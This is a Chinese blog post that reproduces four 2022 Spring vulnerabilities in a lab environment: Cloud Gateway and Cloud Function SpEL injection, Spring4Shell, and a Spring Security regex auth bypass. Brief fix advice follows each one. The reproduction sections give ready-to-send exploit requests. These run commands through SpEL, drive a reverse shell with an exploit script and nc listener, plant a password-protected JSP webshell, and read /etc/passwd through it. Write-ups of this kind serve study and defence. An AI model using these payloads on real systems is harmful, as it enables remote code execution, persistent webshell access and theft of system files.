<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>spring系列漏洞复现CVE-2022-22947、CVE-2022-22963、CVE-2022-22965、CVE-2022-22978 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="spring系列漏洞复现CVE-2022-22947、CVE-2022-22963、CVE-2022-22965、CVE-2022-22978" />
<meta property="og:description" content="目录
Spring Cloud Gateway RCE (CVE-2022-22947)漏洞复现
漏洞原理
漏洞复现
修复建议
Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）漏洞复现
漏洞原理
漏洞复现
修复建议
Spring Framework远程代码执行（CVE-2022-22965）漏洞复现
漏洞原理
漏洞复现
修复建议
Spring-security 认证绕过（ CVE-2022-22978 ）漏洞复现
漏洞原理
漏洞复现
修复建议
Spring Cloud Gateway RCE (CVE-2022-22947)漏洞复现 漏洞原理 Spring Cloud Gateway是基于Spring Framework和Spring Boot构建的API网关，它旨在为微服务架构提供一种简单、有效、统一的API路由管理方式。Spring Cloud Gateway应用程序的Actuator端点，其在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可通过该漏洞恶意创建允许在远程主机上执行任意远程执行的请求。
漏洞复现 启动环境
浏览器访问
使用burp抓包发送到repeater模块修改请求包
构造spel
POST /actuator/gateway/routes/test HTTP/1.1 Host: 192.168.0.154:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Connection: close Content-Type: application/json Content-Length: 331 { &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/320b0767c3b438627f2b57ed21b01351/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-23T18:42:47+08:00" />
<meta property="article:modified_time" content="2023-09-23T18:42:47+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">spring系列漏洞复现CVE-2022-22947、CVE-2022-22963、CVE-2022-22965、CVE-2022-22978</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="articleContentId-toc" style="margin-left:0px;"><a href="#articleContentId" rel="nofollow">Spring Cloud Gateway RCE (CVE-2022-22947)漏洞复现</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86" rel="nofollow">漏洞原理</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">漏洞复现</a></p> 
<p id="%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-toc" style="margin-left:40px;"><a href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE" rel="nofollow">修复建议</a></p> 
<p id="Spring%20Cloud%20Function%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2022-22963%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:0px;"><a href="#Spring%20Cloud%20Function%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2022-22963%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）漏洞复现</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86" rel="nofollow">漏洞原理</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">漏洞复现</a></p> 
<p id="%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-toc" style="margin-left:40px;"><a href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE" rel="nofollow">修复建议</a></p> 
<p id="Spring%20Framework%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22965%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:0px;"><a href="#Spring%20Framework%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22965%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">Spring Framework远程代码执行（CVE-2022-22965）漏洞复现</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86" rel="nofollow">漏洞原理</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">漏洞复现</a></p> 
<p id="%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-toc" style="margin-left:40px;"><a href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE" rel="nofollow">修复建议</a></p> 
<p id="Spring-security%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%88%C2%A0CVE-2022-22978%20%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:0px;"><a href="#Spring-security%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%88%C2%A0CVE-2022-22978%20%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">Spring-security 认证绕过（ CVE-2022-22978 ）漏洞复现</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86" rel="nofollow">漏洞原理</a></p> 
<p id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:40px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">漏洞复现</a></p> 
<p id="%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-toc" style="margin-left:40px;"><a href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE" rel="nofollow">修复建议</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="articleContentId" style="background-color:transparent;">Spring Cloud Gateway RCE (CVE-2022-22947)漏洞复现</h2> 
<h3 id="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</h3> 
<p> Spring Cloud Gateway是基于Spring Framework和Spring Boot构建的API网关，它旨在为微服务架构提供一种简单、有效、统一的API路由管理方式。Spring Cloud Gateway应用程序的Actuator端点，其在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可通过该漏洞恶意创建允许在远程主机上执行任意远程执行的请求。</p> 
<h3 id="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</h3> 
<p>启动环境</p> 
<p><img alt="" height="281" src="https://images2.imgbox.com/57/68/Cfel0hmM_o.png" width="576"></p> 
<p>浏览器访问</p> 
<p><img alt="" height="627" src="https://images2.imgbox.com/9a/e9/rEu9HVht_o.png" width="1200"></p> 
<p>使用burp抓包发送到repeater模块修改请求包</p> 
<p>构造spel</p> 
<pre><code class="hljs">POST /actuator/gateway/routes/test HTTP/1.1
Host: 192.168.0.154:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Connection: close
Content-Type: application/json
Content-Length: 331

{
"id": "test",
"filters": [
{
"name": "AddResponseHeader",
"args": {
"value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}",
"name": "result"
}
}
],
"uri": "http://127.0.0.1:80",
"order": 0
}</code></pre> 
<p><img alt="" height="714" src="https://images2.imgbox.com/65/e4/1Djn6BtM_o.png" width="1077"></p> 
<p> 刷新路由缓存</p> 
<pre><code class="hljs">POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.2.131:8080
Connection: close
Content-Type: application/x-www-form-urlencoded</code></pre> 
<p><img alt="" height="340" src="https://images2.imgbox.com/c6/9a/jkZxKtv3_o.png" width="1074"></p> 
<p>使用get回显命令执行</p> 
<pre><code class="hljs">GET /actuator/gateway/routes/test HTTP/1.1
Host: 192.168.2.131:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close</code></pre> 
<p><img alt="" height="515" src="https://images2.imgbox.com/1b/3f/dMogNEJZ_o.png" width="1200"> 发现执行成功</p> 
<h3 id="%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">修复建议</h3> 
<p>更新升级 Spring Cloud Gateway</p> 
<p>在不考虑影响业务的情况下禁用 Gateway actuator 接口：如application.properties 中配置 management.endpoint.gateway.enabled 为 false</p> 
<h2 id="Spring%20Cloud%20Function%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2022-22963%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）漏洞复现</h2> 
<h3>漏洞原理</h3> 
<p id="ud0b54913">Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于Spring Cloud Function中 RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码</p> 
<h3>漏洞复现</h3> 
<p>启动环境</p> 
<p><img alt="" height="81" src="https://images2.imgbox.com/db/a7/mWkrR0KA_o.png" width="491"></p> 
<p>浏览器访问</p> 
<p><img alt="" height="341" src="https://images2.imgbox.com/10/61/zj7KQ0Np_o.png" width="1094"></p> 
<p>访问当前页面并使用burp抓包，发送到repeater模块中</p> 
<p>更改提交方式，并配合DNSlog查看漏洞是否存在</p> 
<pre><code class="hljs">POST /functionRouter HTTP/1.1
Host: 192.168.0.154:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping unlash.eyes.sh")
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

test</code></pre> 
<p><img alt="" height="643" src="https://images2.imgbox.com/6a/e0/OAYVmiSD_o.png" width="1200"></p> 
<p><img alt="" height="252" src="https://images2.imgbox.com/3f/a4/dG2TvRyL_o.png" width="1200"></p> 
<p>使用工具反弹shell</p> 
<p>将要检测的网址放到 url.txt 文件中</p> 
<p><img alt="" height="370" src="https://images2.imgbox.com/d9/8c/XTYqyduV_o.png" width="1124"></p> 
<blockquote> 
 <p> python3 Spel_RCE_POC.py url.txt</p> 
</blockquote> 
<p><img alt="" height="546" src="https://images2.imgbox.com/d3/4a/U6HraebL_o.png" width="1200"></p> 
<p>证明漏洞存在，开始反弹shell</p> 
<blockquote> 
 <p>python3 Spel_RCE_Bash_EXP.py http://192.168.0.154:8080 192.168.0.154 5555</p> 
 <p></p> 
 <p>nc -lvnp 5555</p> 
</blockquote> 
<p> 此代码将shell反弹到5555端口</p> 
<p><img alt="" height="902" src="https://images2.imgbox.com/71/55/EsUVqbqE_o.png" width="1200"></p> 
<h3>修复建议</h3> 
<p>        安装官方的补丁</p> 
<p>        降级到 JDK 8 或更低版本，消除被攻击的可能性</p> 
<h2 id="Spring%20Framework%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22965%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" style="background-color:transparent;">Spring Framework远程代码执行（CVE-2022-22965）漏洞复现</h2> 
<h3>漏洞原理</h3> 
<p>Spring Framework 是一个开源应用框架，初衷是为了降低应用程序开发的复杂度，具有分层体系结构，允许用户选择组件，同时还为 J2EE 应用程序开发提供了一个好用的框架。当 Spring 部署在 JDK9 及以上版本，远程攻击者可利用该漏洞写入恶意代码导致远程代码执行</p> 
<h3>漏洞复现</h3> 
<p>启动环境</p> 
<p><img alt="" height="76" src="https://images2.imgbox.com/dd/cd/xDvhrVkc_o.png" width="445"></p> 
<p>浏览器访问</p> 
<p><img alt="" height="176" src="https://images2.imgbox.com/0f/bd/K2C01lVf_o.png" width="1142"></p> 
<p>访问当前页面并抓包发送到repeater模块中</p> 
<p>拼接路径进行访问</p> 
<blockquote> 
 <p>GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22fuck%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream();%20int%20a%20=%20-1;%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D;%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b));%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</p> 
</blockquote> 
<p>并在请求头中任意位置加入以下代码</p> 
<blockquote> 
 <p>suffix: %&gt;//<br> c1: Runtime<br> c2: &lt;%</p> 
</blockquote> 
<p><img alt="" height="746" src="https://images2.imgbox.com/1f/2c/Q9J3phsN_o.png" width="1200"></p> 
<p>访问</p> 
<blockquote> 
 <p><a href="http://192.168.0.154:8080/fuck.jsp?pwd=fuck&amp;cmd=cat%20/etc/passwd" rel="nofollow" title="http://192.168.0.154:8080/fuck.jsp?pwd=fuck&amp;cmd=cat /etc/passwd">http://192.168.0.154:8080/fuck.jsp?pwd=fuck&amp;cmd=cat /etc/passwd</a></p> 
</blockquote> 
<p><img alt="" height="283" src="https://images2.imgbox.com/6f/81/fcx5g49V_o.png" width="1200"></p> 
<h3>修复建议</h3> 
<p>升级Spring Framework版本</p> 
<h2 id="Spring-security%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%88%C2%A0CVE-2022-22978%20%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" style="background-color:transparent;">Spring-security 认证绕过（ CVE-2022-22978 ）漏洞复现</h2> 
<h3>漏洞原理</h3> 
<p>当Spring-security使用 RegexRequestMatcher 进行权限配置，由于RegexRequestMatcher正则表达式配置权限的特性，正则表达式中包含“.”时，未经身份验证攻击者可以通过构造恶意数据包绕过身份认证。</p> 
<h3>漏洞复现</h3> 
<p>启动环境</p> 
<p><img alt="" height="108" src="https://images2.imgbox.com/97/67/syw6lFzK_o.png" width="670"></p> 
<p>浏览器访问</p> 
<p><img alt="" height="215" src="https://images2.imgbox.com/83/b7/Gc6dLE9y_o.png" width="1200"></p> 
<p> 直接访问发现被禁止</p> 
<p><img alt="" height="165" src="https://images2.imgbox.com/48/a3/7HP1sEBO_o.png" width="740"></p> 
<p>拼接%0a发现成功访问</p> 
<p><img alt="" height="179" src="https://images2.imgbox.com/07/48/tPVHLCJ2_o.png" width="1087"></p> 
<h3>修复建议</h3> 
<p>升级Spring Security版本</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/085b4ae9daa63934d71ae1b6c4a17aff/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">自己实现SpringBoot三方Starer依赖封装(自动装配自定义实现)</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/3b4f0a27e97020a98f51b2b256a32d57/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Spring Cloud版本选择</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>